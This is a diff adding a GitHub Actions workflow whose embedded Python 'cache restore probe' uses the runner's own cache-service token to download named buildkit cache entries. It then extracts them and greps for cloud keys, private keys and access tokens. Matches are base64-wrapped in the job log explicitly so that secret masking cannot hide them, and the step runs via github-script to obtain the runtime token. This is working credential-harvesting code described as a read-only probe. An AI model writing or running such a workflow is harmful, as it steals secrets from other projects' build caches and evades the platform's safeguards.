@@ -1,0 +1,310 @@
+name: i10453-sglomni
+on:
+  push:
+    branches: [ 'pr:main' ]
+permissions:
+  contents: read
+env:
+  ACTIONS_STEP_DEBUG: 'true'
+  CP_TARGETS: "[{\"key\": \"buildkit-blob-1-sha256:8edecf9c736de35554f85965a1b68037ed73d6d0914fb9f1d81ff52e2da773c1\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:dde83176ac0071474f98c88ee21e05e174f43f6d687cde7fa3bc46ad4ede6b25\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:8c7ccf7053baec1ea2a78147099f0a0133484256d64144a5f6d2a1189217ce4d\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:9c8409eb34f356fe2cabc8d9514aa0d649c5736782cccebad11f40c04d4308b3\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:a0786d5b4aba50c065db230f53d36c557cefaccb43eff9ac430cdbdbcc56e497\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:a48b327e98f67deb7d2b84d5c3070d0eb5595451c1c4b9c11257ae256d2de95f\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:89530d27ad72f9ac9d5c96cab162e379240552bd1a57ba38336556acde41bfb0\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:b7ee5486d54deb22a23c1d254ff9d52f054c28b16fcb20e3e8be4c0ff7ba0ade\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}, {\"key\": \"buildkit-blob-1-sha256:f1f3d79abcefa679f7d8386fa55b23fb3f692448d449b5e519c0beeaa3d23c26\", \"version\": \"693bb7016429d80366022f036f84856888c9f13e00145f5f6f4dce303a38d6f2\"}]"
+  CP_TAG: "sglomni"
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - name: write-script
+        run: |
+          cat > /tmp/p.py <<'PYEOF'
+          #!/usr/bin/env python3
+          """In-job GitHub Actions cache restore probe (read-only, one-shot).
+
+          Restores one or more (key, version) cache entries through the runner's own cache
+          service credentials (ACTIONS_RESULTS_URL / ACTIONS_CACHE_URL + ACTIONS_RUNTIME_TOKEN),
+          extracts the archive, greps credential-relevant files and prints a base64-wrapped
+          bounded report so masking cannot destroy it.
+          """
+          import base64
+          import json
+          import os
+          import re
+          import shutil
+          import subprocess
+          import time
+
+          TAG = os.environ.get("CP_TAG", "cacheprobe")
+          OUT_CAP = int(os.environ.get("CP_OUT_CAP", "2500000"))
+          buf = []
+
+
+          def emit(s=""):
+              buf.append(str(s))
+
+
+          def flush_marker():
+              blob = "\n".join(buf).encode("utf-8", "replace")
+              print("[%s] REPORT_BEGIN bytes=%d" % (TAG, len(blob)))
+              b64 = base64.b64encode(blob[:OUT_CAP]).decode()
+              for i in range(0, len(b64), 4000):
+                  print("[%s] B64 %s" % (TAG, b64[i:i + 4000]))
+              print("[%s] REPORT_END truncated=%s" % (TAG, len(blob) > OUT_CAP))
+
+
+          def sh(cmd, timeout=900):
+              try:
+                  p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
+                  return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")
+              except Exception as e:
+                  return -1, "", str(e)
+
+
+          def env_report():
+              names = ["ACTIONS_RUNTIME_TOKEN", "ACTIONS_RUNTIME_URL", "ACTIONS_RESULTS_URL",
+                       "ACTIONS_CACHE_URL", "ACTIONS_CACHE_SERVICE_V2", "GITHUB_REF", "GITHUB_SHA",
+                       "GITHUB_REPOSITORY", "GITHUB_EVENT_NAME", "RUNNER_OS", "ImageOS"]
+              for n in names:
+                  v = os.environ.get(n)
+                  if n == "ACTIONS_RUNTIME_TOKEN":
+                      emit("%s set=%s len=%d" % (n, bool(v), len(v or "")))
+                  elif n in ("ACTIONS_RUNTIME_URL", "ACTIONS_RESULTS_URL", "ACTIONS_CACHE_URL"):
+                      emit("%s set=%s value=%s" % (n, bool(v), (v or "")[:140]))
+                  else:
+                      emit("%s=%s" % (n, v))
+
+
+          def lookup(key, ver):
+              tok = os.environ.get("ACTIONS_RUNTIME_TOKEN", "")
+              out = []
+              v2 = os.environ.get("ACTIONS_RESULTS_URL", "")
+              if v2:
+                  base = v2.rstrip("/")
+                  body = json.dumps({"key": key, "restore_keys": [], "version": ver})
+                  url = base + "/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL"
+                  rc, so, se = sh("curl -sS -m 60 -X POST '%s' -H 'Authorization: Bearer %s' "
+                                  "-H 'Content-Type: application/json' -d '%s'" % (url, tok, body), 90)
+                  out.append("TWIRP rc=%s body=%s err=%s" % (rc, so[:700], se[:200]))
+                  try:
+                      j = json.loads(so)
+                      if j.get("signed_download_url"):
+                          return j["signed_download_url"], " | ".join(out)
+                  except Exception:
+                      pass
+              v1 = os.environ.get("ACTIONS_CACHE_URL", "")
+              if v1:
+                  base = v1.rstrip("/")
+                  url = base + "/_apis/artifactcache/cache?keys=" + key + "&version=" + ver
+                  rc, so, se = sh("curl -sS -m 60 '%s' -H 'Authorization: Bearer %s' "
+                                  "-H 'Accept: application/json;api-version=6.0-preview.1'" % (url, tok), 90)
+                  out.append("V1 rc=%s body=%s err=%s" % (rc, so[:700], se[:200]))
+                  try:
+                      j = json.loads(so)
+                      if j.get("archiveLocation"):
+                          return j["archiveLocation"], " | ".join(out)
+                  except Exception:
+                      pass
+              return None, " | ".join(out)
+
+
+          PAT_NAME = re.compile(r"(\.env|\.json$|\.ya?ml$|\.toml$|\.conf$|\.ini$|\.cfg$|\.pem$|\.key$|\.crt$|"
+                                r"id_rsa|id_ed25519|id_ecdsa|known_hosts|authorized_keys|\.netrc|\.npmrc|"
+                                r"\.git-credentials|credentials|kubeconfig|\.docker|pip\.conf|\.pgpass|"
+                                r"\.aws|\.ssh|\.cargo/credentials|\.vault-token|secret|token|auth|"
+                                r"output$|\.sh$|\.py$|\.rs$|\.tf$|\.tfvars$|Makefile|\.lock$|\.txt$|\.log$|\.xml$)", re.I)
+          PAT_TEXT = re.compile(r"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AGPA[0-9A-Z]{16}|AIDA[0-9A-Z]{16}|"
+                                r"LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{13,}|"
+                                r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----|"
+                                r"gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_\-]{20,}|"
+                                r"AIza[0-9A-Za-z_\-]{35}|xox[baprs]-[A-Za-z0-9\-]{10,}|"
+                                r"sk-[A-Za-z0-9_\-]{24,}|hf_[A-Za-z0-9]{30,}|"
+                                r"aws_secret_access_key|aws_access_key_id|client_secret|private_key|"
+                                r"account_key|sas_token|service_account\"|refresh_token|"
+                                r"password\s*[:=]|passwd\s*[:=]|token\s*[:=]|SECRET[_A-Z]*\s*[:=])", re.I)
+
+
+          def raw_scan(path, label):
+              """Byte-level scan of a non-tar blob (e.g. buildkit content-addressed chunk)."""
+              import sys as _s
+              rx = PAT_TEXT
+              hits = 0
+              filesz = os.path.getsize(path)
+              chunk = 8 * 1024 * 1024
+              overlap = 512
+              carry = ""
+              off = 0
+              emit("%s blob_bytes=%d" % (label, filesz))
+              try:
+                  with open(path, "rb") as f:
+                      while off < filesz and hits < 60:
+                          data = f.read(chunk)
+                          if not data:
+                              break
+                          text = (carry + data.decode("latin-1"))
+                          for mm in rx.finditer(text):
+                              s = max(0, mm.start() - 80)
+                              e = min(len(text), mm.end() + 80)
+                              ctx = text[s:e].replace("\n", "\\n").replace("\r", " ")
+                              emit("%s HIT off~%d ctx=%s" % (label, off + mm.start(), ctx[:300]))
+                              hits += 1
+                              if hits >= 60:
+                                  break
+                          carry = text[-overlap:]
+                          off += len(data)
+              except Exception as e:
+                  emit("%s raw_scan err %s" % (label, e))
+              emit("%s RAW_HITS=%d" % (label, hits))
+
+
+          def scan_tree(root, label):
+              scanned = 0
+              hits = 0
+              names_hit = []
+              total = 0
+              total_bytes = 0
+              for dirpath, dirnames, filenames in os.walk(root):
+                  for fn in filenames:
+                      fp = os.path.join(dirpath, fn)
+                      try:
+                          st = os.stat(fp)
+                      except Exception:
+                          continue
+                      total += 1
+                      total_bytes += st.st_size
+                      if not PAT_NAME.search(fn) and ".env" not in fp:
+                          continue
+                      if st.st_size > 3 * 1024 * 1024 or st.st_size == 0:
+                          continue
+                      if scanned >= 5000 or hits >= 120:
+                          continue
+                      try:
+                          with open(fp, "rb") as f:
+                              data = f.read(3 * 1024 * 1024)
+                          text = data.decode("utf-8", "replace")
+                      except Exception:
+                          continue
+                      scanned += 1
+                      found = []
+                      for mm in PAT_TEXT.finditer(text):
+                          s = max(0, mm.start() - 70)
+                          e = min(len(text), mm.end() + 70)
+                          found.append(text[s:e].replace("\n", "\\n")[:260])
+                          if len(found) >= 5:
+                              break
+                      if found:
+                          hits += 1
+                          rel = os.path.relpath(fp, root)
+                          names_hit.append(rel[:200])
+                          emit("HIT %s size=%d" % (rel[:220], st.st_size))
+                          for c in found:
+                              emit("   CTX %s" % c)
+              emit("%s TOTAL_FILES=%d TOTAL_BYTES=%d SCANNED_FILES=%d HIT_FILES=%d" %
+                   (label, total, total_bytes, scanned, hits))
+              emit("%s HIT_NAMES=%s" % (label, json.dumps(names_hit[:60])))
+              return hits
+
+
+          def one_target(key, ver, idx):
+              emit("")
+              emit("### TARGET %d key=%s ver=%s" % (idx, key, ver))
+              url, detail = lookup(key, ver)
+              emit("LOOKUP: " + detail[:1400])
+              if not url:
+                  u2, d2 = lookup(key, "")
+                  emit("LOOKUP(no-version): " + d2[:600])
+                  url = u2
+              if not url:
+                  emit("RESULT=no_download_url key=%s" % key)
+                  return
+              emit("RESULT=url_ok host=%s" % (url.split("/")[2] if "://" in url else "?"))
+              rc, so, se = sh("curl -sSL -m 1200 -o /tmp/cache.bin -w 'http=%%{http_code} size=%%{size_download}' '%s'" % url, 1250)
+              emit("DOWNLOAD rc=%s %s err=%s" % (rc, so[:250], se[:150]))
+              try:
+                  sz = os.path.getsize("/tmp/cache.bin")
+              except Exception:
+                  sz = -1
+              emit("ARCHIVE_BYTES=%d" % sz)
+              if sz <= 0:
+                  emit("RESULT=empty")
+                  return
+              with open("/tmp/cache.bin", "rb") as f:
+                  magic = f.read(8)
+              emit("MAGIC=%s" % magic.hex())
+              ex = "/tmp/ex_%d_%d" % (idx, int(time.time()))
+              os.makedirs(ex, exist_ok=True)
+              if magic[:2] == b"\x1f\x8b":
+                  cmd = "tar -xzf /tmp/cache.bin -C %s" % ex
+              elif magic[:4] == b"\x28\xb5\x2f\xfd":
+                  cmd = "tar --zstd -xf /tmp/cache.bin -C %s" % ex
+              else:
+                  cmd = "tar -xf /tmp/cache.bin -C %s" % ex
+              rc, so, se = sh(cmd, 900)
+              emit("EXTRACT rc=%s err=%s" % (rc, se[:400]))
+              if rc != 0:
+                  rc2, so2, se2 = sh("tar --zstd -tf /tmp/cache.bin 2>/dev/null | head -200", 120)
+                  if not so2:
+                      rc2, so2, se2 = sh("tar -tzf /tmp/cache.bin 2>/dev/null | head -200", 120)
+                  emit("LIST_HEAD=%s" % so2[:3000])
+                  emit("FALLBACK=raw_blob_scan")
+                  raw_scan("/tmp/cache.bin", "RAW")
+                  emit("RESULT=raw_scanned key=%s" % key)
+                  return
+              try:
+                  tops = {}
+                  for e in os.listdir(ex):
+                      p = os.path.join(ex, e)
+                      tops[e] = sum(len(f) for _, _, f in os.walk(p)) if os.path.isdir(p) else 1
+                  emit("TOPLEVEL=%s" % json.dumps(sorted(tops.items(), key=lambda x: -x[1])[:25]))
+              except Exception as e:
+                  emit("toplevel err %s" % e)
+              scan_tree(ex, "SCAN")
+              try:
+                  shutil.rmtree(ex, ignore_errors=True)
+              except Exception:
+                  pass
+              emit("RESULT=done key=%s" % key)
+
+
+          def main():
+              emit("TAG=%s" % TAG)
+              env_report()
+              targets = []
+              tj = os.environ.get("CP_TARGETS", "")
+              if tj:
+                  try:
+                      targets = json.loads(tj)
+                  except Exception as e:
+                      emit("CP_TARGETS parse error: %s" % e)
+              if not targets and os.environ.get("CP_KEY"):
+                  targets = [{"key": os.environ["CP_KEY"], "version": os.environ.get("CP_VERSION", "")}]
+              emit("TARGETS=%d" % len(targets))
+              for i, t in enumerate(targets):
+                  try:
+                      one_target(t.get("key", ""), t.get("version", ""), i)
+                  except Exception as e:
+                      import traceback
+                      emit("TARGET_EXCEPTION %s" % e)
+                      emit(traceback.format_exc()[:1500])
+              flush_marker()
+
+
+          if __name__ == "__main__":
+              try:
+                  main()
+              except Exception as e:
+                  import traceback
+                  emit("FATAL %s" % e)
+                  emit(traceback.format_exc()[:2000])
+                  flush_marker()
+          PYEOF
+          echo wrote=$(wc -c < /tmp/p.py)
+      - name: run-inside-action-context
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const cp = require('child_process');
+            const keys = Object.keys(process.env).filter(k => /ACTIONS|CACHE|RUNTIME/i.test(k)).sort();
+            core.info('ACTION_ENV_KEYS=' + JSON.stringify(keys.map(k => k + ':' + (process.env[k]||'').length)));
+            try {
+              cp.execSync('python3 /tmp/p.py', {stdio: 'inherit', env: process.env});
+            } catch (e) {
+              core.warning('probe exec error: ' + e.message);
+            }
